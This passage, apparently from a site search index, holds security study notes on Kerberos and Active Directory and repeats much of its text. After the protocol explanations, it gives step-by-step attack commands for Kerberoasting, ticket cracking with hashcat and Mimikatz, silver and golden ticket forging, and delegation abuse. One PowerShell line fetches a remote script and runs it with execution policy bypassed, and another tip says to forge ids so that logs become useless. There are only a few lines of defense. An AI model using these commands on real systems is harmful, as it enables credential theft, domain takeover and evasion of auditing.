crackable) KDC Key - Krbtgt account's hash (not easily crackable) Service Session Key User details TGS will not do a permission validation. If user has a valid TGT that is all it takes to obtain a TGS. Validating if the user has access to the service is up to the service. Service Session Key and Service Ticket is stored in Kerberos Tray (?) Client send the following to service when necessary: Encrypted Service Ticket Time stamped authenticator encrypted with the Service Session Key Service will: Decrypt the Service Ticket with its secret and validate both HMAC Validate timestamped authenticator. If both are fine, decrypted Service Ticket and check Privilege Attribute Certificate (PAC) to decide if access should be granted. 2 HMAC signatures during PAC Validation : Target key - Service account's hash (might be crackable) Always verified KDC key - Krbtgt account's hash (not easily crackable) Verified with KDC \"sometimes\" (since data should be sent to KDC for verification) Windows send PAC Validation message to NetLogin service of DC if: TCB (act as part of the OS) privilege is not there and it is not a Service Control Manager (SCM) account. :. generally if application is running as a service in local system, hash is not checked: SQL Server, Exchange server: Generally does not check App pools in web servers: Always check Can be asked to check always using regkey \"ValidateKdcPacSignature\" Service may: Send a response with timestamp encrypted with the Service Session Key Client decrypt and verify to prevent MitM Inter-forest Authentication Instead of encrypting with Domain1\u2019s krbtgt account, a ticket is encrypted/signed with the inter-realm trust key that the domains previously exchanged, which is called as an \u201c Inter-realm ticket-granting-ticket/TGT. \u201d Then Domain2 verifies the TGT included in the referral, decrypts it with the previously negotiated inter-realm trust key and proceeds further. An inter-realm TGT can be forged. Other Services (Microsoft Implementation) When a domain account is configured to run a service (ex: MS SQL) in the environment, a Service Principal Name (SPN) is used in the domain to associate the service with a login account . krbtgt password Changes with domain functional level update (ex: NT5 - NT6) Recovery from restore media Manually changed (compromise recovery) Formats Encoded in ASN . 1 Kerberos Tickets are in KRB - CRED format: RFC4120 Microsoft Specific PAC format: cc237917 Attack Patterns Kerberos brute-force Automated continued attempts to guess a password ASREPRoast Kerberoasting References https://pentestlab.blog/2018/06/12/kerberoast/ Quick Reference** The process of cracking Kerberos service tickets and rewriting them in order to gain access to the targeted service. Doesn\u2019t require any interaction with the service as legitimate active directory access can be used to request and export the service ticket which can be cracked offline in order to retrieve the plain-text password of the service because service tickets are encrypted with the hash (NTLM) of the service account so any domain user can dump hashes from services without the need to get a shell into the system that is running the service. Any domain user has the rights by default on a standard domain to: To request a Service Ticket for any service. Permission checks are done later at the service. Request a copy of the service accounts . Request correlating password hash relevant to service accounts (?) Crackable and important tickets can be identified by considering: SPNs bind to domain user accounts Password last set Password expiration Last logon Tips Look for SQL Server instances with domain admin used as the service account This is not recommended Instead, each service should use separate user accounts SMB by default use a computer account Exchange server defaults to user account Step 1 - Service Provider Name (SPN) and SPN Discovery Format: ServiceType / Host [ :Port ][ /DistinguishedName ] [ ServiceAccountName ] Users system doesn't know the account running the service But KDC needs this info, so that Service Ticket can be encrypted using that account's hash SPN is the name by which a Kerberos client uniquely identifies an instance of a service for a given Kerberos target computer KDC has a mapping between [\"Service\" to \"Account\"] A given service instance can have multiple SPNs if there are multiple names that clients might use for authentication. SPN always includes the name of the host computer A SPN is registered for each host alias Point users to the appropriate resource for connection Discovery via LDAP queries Help in identify hosts that are running important services Look for services associated with \"User\" accounts (can be easier to crack, compared to \"Computer\" accounts) - GetUserSPNs List of SPNs: https://adsecurity.org/?page_id=183 References: Microsoft - Service Principal Names (SPN): SetSPN Syntax Tools SetSPN - Can, view, edit, and delete SPN registrations. Register setspn - s ServiceClass / Host : Port AccountName setspn - s FIMService / FIMSVR . contoso . com CONTOSO \\ FIMService (-s verify that there are no duplicates) setspn - s http / CES1 . corp . contoso . com CORP \\ CES View all the mappings: setspn - L hostname (?) setspn - T pentestlab - Q * /* Delete: setspn - d ServiceClass / Host : Port AccountName Reset SPN registrations for account: setspn - r AccountName Re-register all SPNs for a given host: setspn - R hostname Discover missing SPNs: DCDIAG / s : ServerName / c / v Write back computer account's AD replication SPN: DCDIAG / fix Restart NTDS: net stop ntds net start ntds Check DC security errors (duplicate SPNs, etc): DCDIAG / test : checksecurityerror GetUserSPNs - Query the active directory to discover only services that are associated with a user account Part of: https://github.com/nidem/kerberoast powershell_import / root / Desktop / GetUserSPNs . ps1 cscript . exe GetUserSPNs . vbs PowerShell AD Recon Part of: https://github.com/PyroTek3/PowerShell-AD-Recon Query the Active Directory for interesting services such as Exchange, Microsoft SQL, Terminal etc powershell_import / root / Discover-PSMSSQLServers . ps1 powershell_execute Discover-PSMSSQLServers powershell_import / root / Discover-PSMSExchangeServers . ps1 powershell_execute Discover-PSMSExchangeServers Find service accounts: powershell_import / root / Find-PSServiceAccounts . ps1 powershell_execute Find-PSServiceAccounts Empire: usemodule situational_awareness / network / get_spn PowerShellery Part of: https://github.com/nullbind/Powershellery Get-SPN -type service -search * -List yes | Format-Table Get-SPN -type service -search * Get UserSID, the service and the actual User. Import-Module .\\ Get-DomainSpn . psm1 Get-DomainSpn Impacket Valid domain credentials are required for communication with the Active Directory as token based authentication cannot be used. ./ GetUserSPNs . py -dc-ip 10 . 0 . 0 . 1 pentestlab . local / test Step 2 - Request Service Tickets Request is sent to the KDC , hence it's not required that service is accessible, available or even exit anymore. Request the service ticket for a specific SPN: Add-Type -AssemblyName System . IdentityModel New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80 Alternatively, use Mimikatz by specifing target as the service principal name: kerberos :: ask / target : PENTESTLAB_001 / WIN - PTELU2U07KG . PENTESTLAB . LOCAL : 80 List all available cached tickets: klist Invoke-Mimikatz -Command kerberos::list load kiwi kerberos_ticket_list kiwi_cmd kerberos :: list Request Kerberos service tickets that belong to domain users only which should be easier to cracked compared to computer accounts service tickets (requires valid domain credentials in order to interact with the Active Directory since it will executed from a system that is not part of a domain): ./ GetUserSPNs . py -request pentestlab . local / test Automatically identify weak service tickets based on user account and password expiry (RiskySPN: https://github.com/cyberark/RiskySPN ): Find-PotentiallyCrackableAccounts -FullData -Verbose All user accounts that have an associated SPN: Find-PotentiallyCrackableAccounts -Domain pentestlab.local Export to CVS (offline cracking): Export-PotentiallyCrackableAccounts Get service tickets for service instance by its SPN: Get-TGSCipher -SPN PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80 Various functions that can be executed to request, list and export service tickets: Auto-Kerberoast List-UserSPNs List-UserSPNs -Domain pentestlab.local Mass request tickets (ticket for each account) Add-Type -AssemblyName System . IdentityModel setspn . exe -T lab . local -Q */- | Select-String ^CN -Content 0 , 1 | % { New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList $_ . Context . PostContext [ 0 ]. Trim () } ./ GetUserSPNs . ps1 | % { New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList $_ . ServicePrincipalName } Step 3 - Export Service Tickets List all available tickets from memory and save in remote host: Invoke-Mimikatz -Command kerberos::list /export PowerShell Empire: usemodule credentials / mimikatz / extract_tickets standard :: base64 kerberos :: list / export Extract Ticket hashes for services that support Kerberos authentication: usemodule credentials / invoke_kerberoast AutoKerberoast will request and extract all the service tickets in base64 format. Invoke-AutoKerberoast Invoke-AutoKerberoast -GroupName Domain Admins -Domain pentestlab . local -HashForm Extract hashed in different formats (John, Hashcat and Kerberoast) - eliminates the need of Mimikatz for ticket export Get-TGSCipher -SPN PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80 -Format John Extract TGT responses from PCAP: extracttgsrepfrompcap . py Step 4 - Crack Service Tickets Crack ticket: python tgsrepcrack . py / root / Desktop / passwords . txt PENTESTLAB_001 . kirbi Extract the Hash from Service Ticket python extractServiceTicketParts . py PENTESTLAB_001 . kirbi tgscrack . exe - hashfile hash . txt - wordlist passwords . txt If PowerShell remoting is enabled then the password that has been retrieved from the service ticket can be used for execution of remote commands and for other lateral movement operations. Enable-PSRemoting $pass = Password123 | ConvertTo-SecureString -AsPlainText -Force $creds = New-Object System . Management . Automation . PSCredential -ArgumentList PENTESTLAB_001 , $pass Invoke-Command -ScriptBlock { get-process } -ComputerName WIN-PTELU2U07KG . PENTESTLAB . LOCAL -Credential $creds Dump returned service account with its correlating password hash: powershell -ep bypass -c IEX (New-Object System.Net.WebClient).DownloadString( https://raw.githubusercontent.com/nettitude/PoshC2/master/Modules/powerview.ps1 Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash1.txt hashcat64 . exe -m 13100 C:\\Hash1.txt C : \\ Rocktastic12a - -outfile = C:\\OutputHash1.txt ` Step 5 - Rewrite Service Tickets RAM Injection Kerberos tickets are signed with the NTLM hash of the password. If the ticket hash has been cracked then it is possible to rewrite the ticket with Kerberoast python script. Allow: Impersonate any domain user when the service is going to be accessed. Privilege escalation is also possible as the user can be added into an elevated group such as Domain Admins. python kerberoast . py -p Password123 -r PENTESTLAB_001 . kirbi -w PENTESTLAB . kirbi -u 500 python kerberoast . py -p Password123 -r PENTESTLAB_001 . kirbi -w PENTESTLAB . kirbi -g 512 Also fake account. Use Mimikatz to generate ticket (change RID of the account to 1106): kerberos :: golden / domain : lab . local / sid : sid / groups : 123 , 124 , 125 / target : target . local / service : MSSQLSvc / ticket : target . local . kirbi / rc4 : service s hash / ppt / id : 1106 / user : tm / ppt will directly inject the fake account into memory. / id and / user can be invalid values, so that logs will be useless / groups can be altered to add user to domain-admin The new ticket can be injected back into the memory with kerberos :: ptt PENTESTLAB . kirbi Defense Use *- ADServiceAccount cmdlet to create service accounts Pick really random, good passwords (25+ chars ) Monitor DC for bursts of Service Ticket requests (Event ID 4769) Force services to verify PAC - Doesn't prevent cracking - Prevent writing - Can impact performance Pass the key Pass the ticket The process of forging a session key and presenting that forgery to the resource as credentials Silver Ticket Silver Ticket: A forged ticket that grants access to a serviceCredential stuffing. Password hashes of service accounts could be used to create Kerberos session ticket (TGS) has a sever portion which is encrypted with the password hash of the service account. Can request a ticket and do offline brute forcing. https://drive.google.com/open?id=1iSXKVgkO_U61MCf0ItaZgyMt-406pWdD KDC does not handle authorization Can request TGS for any service TGS is encrypted using target-service NTLM hash .:. it is possible to brute-force the TGS to get target-service account credentials Find Service Accounts GetUserSPNs - https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py PowerView (SPN = Service Principal Name) Get-Netuser -SPN ActiveDirectory Module Install-ActiveDirectoryModule -DllPath C : \\ AdModule \\ Microsoft . ActiveDirectory . Management . dll ADModulePath C : \\ AdModule \\ ActiveDirectory . psd1 Get-ADUser -Filter { ServicePrincipalName -ne $null } -Properties ServicePrincipalName Request SPN Ticket Add-Type -AssemblyName System . IdentityModel New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList server-name - PowerView Request-SPNTicket Save Tieket List all tickets in cache (check if granted): klist Mimikatz: Invoke - Mimikatz - Command kerberos::list /export Bruteforce tgsrepcrack or use John python . exe . \\ tgsrepcrack . py . \\ password . txt ticket Golden Ticket Golden Ticket: A ticket that grants a user domain admin access Ticket not made by KDC (ticket is self-made) Not limited by GPO Smart-card independent Hence, it's possible to push anything Since we have krbtgt Can modify PAC Group ID, SID, Username Kerberos is stateless All account policy is client side enforcement Disabled / Expiry / Logon hours Silo memberships Protected Users and other group memberships With Kerberos 5 - TGS / KDC has no way of validating that account is still valid when presented with TGT. Microsoft implement: If TGT is older than 20 mins the TGS will validate the account with KDC when issuing a service ticket. Account validity and check enabled state is checked. However, with Golden Ticket we issuer our own TGT. Therefore, it is possible to issue TGT with recent issued-times to bypass this check. Why attack on TGT, but not on TGS? Service account passwords are rotated every 30-40 days. Krbtgt account password is never changed. A singled TGT can get many TGS. Ticket Encryption PAC KDC Signature PAC Server Signature TGT krbtgt krbtgt krbtgt TGS target krbtgt target Generating \"Golden Ticket\" requires: KDC key (krbtgt) SID of the domain (whom, psgetsid) Domain name lsadump :: lsa / inject / name : krbtgt kerberos :: golden / domain : domain / sid : domain - sid / rc4 : ntlm - hash - of - krbtgt / user : Administrator / id : 500 - RID of the user ( 500 is domain admin ) / groups : 513 , 512 , 520 , 518 , 519 / ticket : Administrator.kirbi - ticket filename Encryption downgrade with Skeleton Key Malware A malware that can bypass Kerberos, but the attack must have Admin access DCShadow attack A new attack where attackers gain enough access inside a network to set up their own DC to use in further infiltration Smart Card Authentication with DH Keys If certificate based authentication is required DH must be implemented (as per spec) RFC 4556 RFC 5349 Microsoft improved current protocol with draft: https://tools.ietf.org/html/draft-ietf-kitten-pkinit-freshness-07 https://datatracker.ietf.org/meeting/91/session/kitten https://datatracker.ietf.org/meeting/91/materials/slides-91-kitten-1.pdf In order for GPO to work full network should be aware of it ( Windows 10 2016) Detect using IPS rule to inspect AS - RE Q ( AS - REQ is now signed, not encrypted) Attacking Windows PKI Mimikatz can export Windows CA (NTAuth certificate store ) Ask PKI server to generate a raw certificate (with any required expiry and any required user) without CRLDP so that cert cannot be revoked. Kerberos Delegation Allows reusing the end-user credentials to access resources hosted on a different server. Used when Kerberos Double Hop is required. Impersonating the incoming/authentication user is necessary to work. Types: Unconstrained (only Windows Server 2003 ) - Allow authentication to any service in the domain Constrained Unconstrained Kerberos Delegation - https://drive.google.com/open?id=1VZvQcin4RN7PkByplk-LhI1P3mrCoJXY User provide credentials to DC DC returns TGT User request TGS for web service DC provides TGS (TGS contains user's TGT) User sends TGT and TGS to web Server Web server service account use user's TGT to request a TGS got database server from DC - Web server service account can decrypt TGS and extract the user's TGT - This is because TGS is encryoted with web server service account's NTLM hash Web server service account connects to database impersonating the user Identifying Nodes with Unconstrained Delegation Enabled Get - NetComputer - UnConstrained Get - ADComputer - Filter { TrustedForDelegation - eq $ True } Get - ADUser - Filter { TrustedForDelegation - eq $ True } Attack Pattern Compromise the server that use unconstrained delegation Wait for a high privileged connect Once connected, export all the tickets including TGT for that User Invoke - Mimikatz - Command sekurlsa::tickets /export Reuse tickets with Invoke - Mimikatz - Command kerberos::ppt C:\\tickets\\admin.kirbi Constrained Kerberos Delegation Only provide access to specified services on a specifiv computer Service account must have TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute Service account can asccess all services specified in msDS-AllowedToDelegateTo attribute Identifying Users with Unconstrained Delegation Enabled Get - DomainUser - TrustedToAuth Get - DomainComputer - TrustedToAuth Install - ActiveDirectoryModule - DllPath C : \\ AdModule \\ Microsoft . ActiveDirectory . Management . dll ADModulePath C : \\ AdModule \\ ActiveDirectory . psd1 Get - ADObject - Filter { msDS - AllowedToDelegateTo - ne $null } - Properties msDS - AllowedToDelegateTo - Attack Patterns Protocol Transition used in SSO Delegation occurs not only for the specific service but for any service running under the same account. No validation for the SPN specified. https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/ References https://docs.microsoft.com/en-us/windows/desktop/secauthn/authentication-portal https://docs.microsoft.com/en-us/windows/desktop/secauthn/microsoft-kerberos https://drive.google.com/open?id=1eaQki6QuqfbHqMfkaKH66z2OAnI0lV0H Tim Medin - Attacking Kerberos: Kicking the Guard Dog of Hades New References Attacking Microsoft Kerberos Kicking the Guard Dog of Hades Tim Medin https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/ https://www.tarlogic.com/en/blog/how-kerberos-works/ https://www.tarlogic.com/en/blog/how-to-attack-kerberos/","title":"Kerberos"},{"location":"iam-kerberos/#kerberos","text":"","title":"Kerberos"},{"location":"iam-kerberos/#protocol-summary","text":"Designed to lessening authentication related packets transmitted in the network Not designed for today's network security Loosing KDC means, security is at total loss Kerberos uses either UDP / 88 or TCP / 88 as transport protocol. Hence Kerberos itself is responsible of encrypting data. Several agents working together: Client or user: who wants to access to the service. AP ( Application Server ) : offers the service required by the user. KDC ( Key Distribution Center ) : main service of Kerberos, responsible of issuing the tickets, installed on the DC (Domain Controller). It is supported by the AS ( Authentication Service ) , which issues the TGTs . Keys: KDC key or krbtgt key : Derivate from krbtgt account NTLM hash. User key : Derivate from user NTLM hash. Service key : Derivate from the NTLM hash of service owner, which can be an user or computer account. Session key : Negotiated between the user and KDC. Service session key : to be use between user and service. Tickets: TGS ( Ticket Granting Service ) : Ticket which user can use to authenticate against a service. It is encrypted with the service key. TGT ( Ticket Granting Ticket ) : Ticket presented to the KDC to request for TGSs. It is encrypted with the KDC key. PAC ( Privilege Attribute Certificate ) is an structure included in almost every ticket. It is possible to services to verify the PAC by communicating with the KDC Messages: KRB_AS_REQ : Used to request the TGT to KDC. KRB_AS_REP : Used to deliver the TGT by KDC. KRB_TGS_REQ : Used to request the TGS to KDC, using the TGT. KRB_TGS_REP : Used to deliver the TGS by KDC. KRB_AP_REQ : Used to authenticate a user against a service, using the TGS. KRB_AP_REP : (Optional) Used by service to identify itself against the user. KRB_ERROR : Message to communicate error conditions. KERB_VERIFY_PAC_REQUEST : AP send message to KDC including the signature of PAC, and verify if it is correct. (not part of Kerberos, but NRPC)","title":"Protocol Summary"},{"location":"iam-kerberos/#protocol-flow","text":"Ref: https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png Source: https://www.varonis.com/blog/kerberos-authentication-explained/ Ref: https://www.youtube.com/watch?v=VpBCJ8vS7T0 Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf","title":"Protocol Flow"},{"location":"iam-kerberos/#client-kdc-pre-auth-kerberos-5","text":"Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf Client constructs an authenticator (request for TGT) containing: Identify information - unencrypted. Timestamp - encrypted using user's password (hash). User's password (hash) is used as symmetric key. When a client sends a request ( AS-REQ ) for a ticket to the Key Distribution Center (KDC) . A timestamp is sent encrypted with user's password hash (also called user's long term key ). [When using SmartCard] [non-DH] Timestamp is signed using public-key and public-key is sent to DC [DH] Timestamp is signed using public-key and public-key and DH parameters are sent to DC If request can be decrypted with user's password hash, And If request's time is within 5 minutes: The KDC creates a Ticket-Granting Ticket (TGT) for the client Special ticket that permits the client to obtain additional Kerberos tickets within the same Kerberos realm. Usually good for 10 hours. Containing: client name IP address timestamp validity period - 10 hours max by default Sends ( AS-REP ) the encrypted TGT + TGS Session Key back to the client User portion (client can decrypt) - Encrypted with user's password (hash), contains: TGS Session Key - Usable to encrypt communication between client and TGS [When using SmartCard] - [non-DH] Encrypted with public-key - [DH] Encrypted with DH info (?) not public-key Server portion (client cannot decrypt) - Encrypted with KDC's secret key ( Domain key / krbtgt account ), contains: TGT - Permits the client to obtain additional tickets (like TGS) which gives permission for specific services. Contains: [Microsoft] Privilege Attribute Certificate (PAC) containing: Username User's RID Group membership PAC is signed with: Target key (for TGT target key is also KDC key) KDC key If TGS Session Key can be decrypted using user's password (hash): Client stores encrypted TGT and decrypted (?) TGS Session Key in Kerberos Tray Always lives in memory Never saved into disk Kerberos Tray can be explored with kerbtray Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf","title":"Client - KDC (Pre-Auth) (Kerberos 5+)"},{"location":"iam-kerberos/#client-service-authentication","text":"TGS - Ticket granting service is a KDC component that issues a service ticket when a client requests connection to a Kerberos service. Client sends following to TGS ( TGS-REQ ) Copy of TGT TGS can decrypt this using KDC's secret key Name of the service Time stamped client ID encrypted with TGS Session Key TGS can decrypt this using user's password (hash) TGS will return ( TGS-REP ): User Portion (User can decrypt) - Encrypted with TGS Session Key Service Session Key Validity time Server Portion / Service Ticket (User cannot decrypt) - Encrypted with service secret key Privilege Attribute Certificate (PAC) 2 HMAC signatures: Target key - Service account's hash (might be crackable) KDC Key - Krbtgt account's hash (not easily crackable) Service Session Key User details TGS will not do a permission validation. If user has a valid TGT that is all it takes to obtain a TGS. Validating if the user has access to the service is up to the service. Service Session Key and Service Ticket is stored in Kerberos Tray (?) Client send the following to service when necessary: Encrypted Service Ticket Time stamped authenticator encrypted with the Service Session Key Service will: Decrypt the Service Ticket with its secret and validate both HMAC Validate timestamped authenticator. If both are fine, decrypted Service Ticket and check Privilege Attribute Certificate (PAC) to decide if access should be granted. 2 HMAC signatures during PAC Validation : Target key - Service account's hash (might be crackable) Always verified KDC key - Krbtgt account's hash (not easily crackable) Verified with KDC \"sometimes\" (since data should be sent to KDC for verification) Windows send PAC Validation message to NetLogin service of DC if: TCB (act as part of the OS) privilege is not there and it is not a Service Control Manager (SCM) account. :. generally if application is running as a service in local system, hash is not checked: SQL Server, Exchange server: Generally does not check App pools in web servers: Always check Can be asked to check always using regkey \"ValidateKdcPacSignature\" Service may: Send a response with timestamp encrypted with the Service Session Key Client decrypt and verify to prevent MitM","title":"Client - Service Authentication"},{"location":"iam-kerberos/#inter-forest-authentication","text":"Instead of encrypting with Domain1\u2019s krbtgt account, a ticket is encrypted/signed with the inter-realm trust key that the domains previously exchanged, which is called as an \u201c Inter-realm ticket-granting-ticket/TGT. \u201d Then Domain2 verifies the TGT included in the referral, decrypts it with the previously negotiated inter-realm trust key and proceeds further. An inter-realm TGT can be forged.","title":"Inter-forest Authentication"},{"location":"iam-kerberos/#other","text":"Services (Microsoft Implementation) When a domain account is configured to run a service (ex: MS SQL) in the environment, a Service Principal Name (SPN) is used in the domain to associate the service with a login account . krbtgt password Changes with domain functional level update (ex: NT5 - NT6) Recovery from restore media Manually changed (compromise recovery) Formats Encoded in ASN . 1 Kerberos Tickets are in KRB - CRED format: RFC4120 Microsoft Specific PAC format: cc237917","title":"Other"},{"location":"iam-kerberos/#attack-patterns","text":"","title":"Attack Patterns"},{"location":"iam-kerberos/#kerberos-brute-force","text":"Automated continued attempts to guess a password","title":"Kerberos brute-force"},{"location":"iam-kerberos/#asreproast","text":"","title":"ASREPRoast"},{"location":"iam-kerberos/#kerberoasting","text":"References https://pentestlab.blog/2018/06/12/kerberoast/","title":"Kerberoasting"},{"location":"iam-kerberos/#quick-reference","text":"The process of cracking Kerberos service tickets and rewriting them in order to gain access to the targeted service. Doesn\u2019t require any interaction with the service as legitimate active directory access can be used to request and export the service ticket which can be cracked offline in order to retrieve the plain-text password of the service because service tickets are encrypted with the hash (NTLM) of the service account so any domain user can dump hashes from services without the need to get a shell into the system that is running the service. Any domain user has the rights by default on a standard domain to: To request a Service Ticket for any service. Permission checks are done later at the service. Request a copy of the service accounts . Request correlating password hash relevant to service accounts (?) Crackable and important tickets can be identified by considering: SPNs bind to domain user accounts Password last set Password expiration Last logon Tips Look for SQL Server instances with domain admin used as the service account This is not recommended Instead, each service should use separate user accounts SMB by default use a computer account Exchange server defaults to user account","title":"Quick Reference**"},{"location":"iam-kerberos/#step-1-service-provider-name-spn-and-spn-discovery","text":"Format: ServiceType / Host [ :Port ][ /DistinguishedName ] [ ServiceAccountName ] Users system doesn't know the account running the service But KDC needs this info, so that Service Ticket can be encrypted using that account's hash SPN is the name by which a Kerberos client uniquely identifies an instance of a service for a given Kerberos target computer KDC has a mapping between [\"Service\" to \"Account\"] A given service instance can have multiple SPNs if there are multiple names that clients might use for authentication. SPN always includes the name of the host computer A SPN is registered for each host alias Point users to the appropriate resource for connection Discovery via LDAP queries Help in identify hosts that are running important services Look for services associated with \"User\" accounts (can be easier to crack, compared to \"Computer\" accounts) - GetUserSPNs List of SPNs: https://adsecurity.org/?page_id=183 References: Microsoft - Service Principal Names (SPN): SetSPN Syntax Tools SetSPN - Can, view, edit, and delete SPN registrations. Register setspn - s ServiceClass / Host : Port AccountName setspn - s FIMService / FIMSVR . contoso . com CONTOSO \\ FIMService (-s verify that there are no duplicates) setspn - s http / CES1 . corp . contoso . com CORP \\ CES View all the mappings: setspn - L hostname (?) setspn - T pentestlab - Q * /* Delete: setspn - d ServiceClass / Host : Port AccountName Reset SPN registrations for account: setspn - r AccountName Re-register all SPNs for a given host: setspn - R hostname Discover missing SPNs: DCDIAG / s : ServerName / c / v Write back computer account's AD replication SPN: DCDIAG / fix Restart NTDS: net stop ntds net start ntds Check DC security errors (duplicate SPNs, etc): DCDIAG / test : checksecurityerror GetUserSPNs - Query the active directory to discover only services that are associated with a user account Part of: https://github.com/nidem/kerberoast powershell_import / root / Desktop / GetUserSPNs . ps1 cscript . exe GetUserSPNs . vbs PowerShell AD Recon Part of: https://github.com/PyroTek3/PowerShell-AD-Recon Query the Active Directory for interesting services such as Exchange, Microsoft SQL, Terminal etc powershell_import / root / Discover-PSMSSQLServers . ps1 powershell_execute Discover-PSMSSQLServers powershell_import / root / Discover-PSMSExchangeServers . ps1 powershell_execute Discover-PSMSExchangeServers Find service accounts: powershell_import / root / Find-PSServiceAccounts . ps1 powershell_execute Find-PSServiceAccounts Empire: usemodule situational_awareness / network / get_spn PowerShellery Part of: https://github.com/nullbind/Powershellery Get-SPN -type service -search * -List yes | Format-Table Get-SPN -type service -search * Get UserSID, the service and the actual User. Import-Module .\\ Get-DomainSpn . psm1 Get-DomainSpn Impacket Valid domain credentials are required for communication with the Active Directory as token based authentication cannot be used. ./ GetUserSPNs . py -dc-ip 10 . 0 . 0 . 1 pentestlab . local / test","title":"Step 1 - Service Provider Name (SPN) and SPN Discovery"},{"location":"iam-kerberos/#step-2-request-service-tickets","text":"Request is sent to the KDC , hence it's not required that service is accessible, available or even exit anymore. Request the service ticket for a specific SPN: Add-Type -AssemblyName System . IdentityModel New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80 Alternatively, use Mimikatz by specifing target as the service principal name: kerberos :: ask / target : PENTESTLAB_001 / WIN - PTELU2U07KG . PENTESTLAB . LOCAL : 80 List all available cached tickets: klist Invoke-Mimikatz -Command kerberos::list load kiwi kerberos_ticket_list kiwi_cmd kerberos :: list Request Kerberos service tickets that belong to domain users only which should be easier to cracked compared to computer accounts service tickets (requires valid domain credentials in order to interact with the Active Directory since it will executed from a system that is not part of a domain): ./ GetUserSPNs . py -request pentestlab . local / test Automatically identify weak service tickets based on user account and password expiry (RiskySPN: https://github.com/cyberark/RiskySPN ): Find-PotentiallyCrackableAccounts -FullData -Verbose All user accounts that have an associated SPN: Find-PotentiallyCrackableAccounts -Domain pentestlab.local Export to CVS (offline cracking): Export-PotentiallyCrackableAccounts Get service tickets for service instance by its SPN: Get-TGSCipher -SPN PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80 Various functions that can be executed to request, list and export service tickets: Auto-Kerberoast List-UserSPNs List-UserSPNs -Domain pentestlab.local Mass request tickets (ticket for each account) Add-Type -AssemblyName System . IdentityModel setspn . exe -T lab . local -Q */- | Select-String ^CN -Content 0 , 1 | % { New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList $_ . Context . PostContext [ 0 ]. Trim () } ./ GetUserSPNs . ps1 | % { New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList $_ . ServicePrincipalName }","title":"Step 2 - Request Service Tickets"},{"location":"iam-kerberos/#step-3-export-service-tickets","text":"List all available tickets from memory and save in remote host: Invoke-Mimikatz -Command kerberos::list /export PowerShell Empire: usemodule credentials / mimikatz / extract_tickets standard :: base64 kerberos :: list / export Extract Ticket hashes for services that support Kerberos authentication: usemodule credentials / invoke_kerberoast AutoKerberoast will request and extract all the service tickets in base64 format. Invoke-AutoKerberoast Invoke-AutoKerberoast -GroupName Domain Admins -Domain pentestlab . local -HashForm Extract hashed in different formats (John, Hashcat and Kerberoast) - eliminates the need of Mimikatz for ticket export Get-TGSCipher -SPN PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80 -Format John Extract TGT responses from PCAP: extracttgsrepfrompcap . py","title":"Step 3 - Export Service Tickets"},{"location":"iam-kerberos/#step-4-crack-service-tickets","text":"Crack ticket: python tgsrepcrack . py / root / Desktop / passwords . txt PENTESTLAB_001 . kirbi Extract the Hash from Service Ticket python extractServiceTicketParts . py PENTESTLAB_001 . kirbi tgscrack . exe - hashfile hash . txt - wordlist passwords . txt If PowerShell remoting is enabled then the password that has been retrieved from the service ticket can be used for execution of remote commands and for other lateral movement operations. Enable-PSRemoting $pass = Password123 | ConvertTo-SecureString -AsPlainText -Force $creds = New-Object System . Management . Automation . PSCredential -ArgumentList PENTESTLAB_001 , $pass Invoke-Command -ScriptBlock { get-process } -ComputerName WIN-PTELU2U07KG . PENTESTLAB . LOCAL -Credential $creds Dump returned service account with its correlating password hash: powershell -ep bypass -c IEX (New-Object System.Net.WebClient).DownloadString( https://raw.githubusercontent.com/nettitude/PoshC2/master/Modules/powerview.ps1 Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash1.txt hashcat64 . exe -m 13100 C:\\Hash1.txt C : \\ Rocktastic12a - -outfile = C:\\OutputHash1.txt `","title":"Step 4 - Crack Service Tickets"},{"location":"iam-kerberos/#step-5-rewrite-service-tickets-ram-injection","text":"Kerberos tickets are signed with the NTLM hash of the password. If the ticket hash has been cracked then it is possible to rewrite the ticket with Kerberoast python script. Allow: Impersonate any domain user when the service is going to be accessed. Privilege escalation is also possible as the user can be added into an elevated group such as Domain Admins. python kerberoast . py -p Password123 -r PENTESTLAB_001 . kirbi -w PENTESTLAB . kirbi -u 500 python kerberoast . py -p Password123 -r PENTESTLAB_001 . kirbi -w PENTESTLAB . kirbi -g 512 Also fake account. Use Mimikatz to generate ticket (change RID of the account to 1106): kerberos :: golden / domain : lab . local / sid : sid / groups : 123 , 124 , 125 / target : target . local / service : MSSQLSvc / ticket : target . local . kirbi / rc4 : service s hash / ppt / id : 1106 / user : tm / ppt will directly inject the fake account into memory. / id and / user can be invalid values, so that logs will be useless / groups can be altered to add user to domain-admin The new ticket can be injected back into the memory with kerberos :: ptt PENTESTLAB . kirbi","title":"Step 5 - Rewrite Service 